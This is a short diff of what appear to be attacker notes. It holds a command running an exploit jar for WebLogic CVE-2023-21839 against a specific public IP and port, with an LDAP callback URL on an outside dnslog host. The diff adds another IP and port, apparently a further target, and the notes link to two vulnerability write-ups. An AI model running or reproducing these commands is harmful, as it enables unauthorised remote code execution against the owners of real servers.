@@ -1,5 +1,5 @@
 java -jar Weblogic-CVE-2023-21839.jar 190.129.63.10:7780 ldap://90473e3f.dnslog.click/test
 
-
+182.156.230.227:9001
 https://m.freebuf.com/vuls/364212.html
 https://cn-sec.com/archives/1691688.html
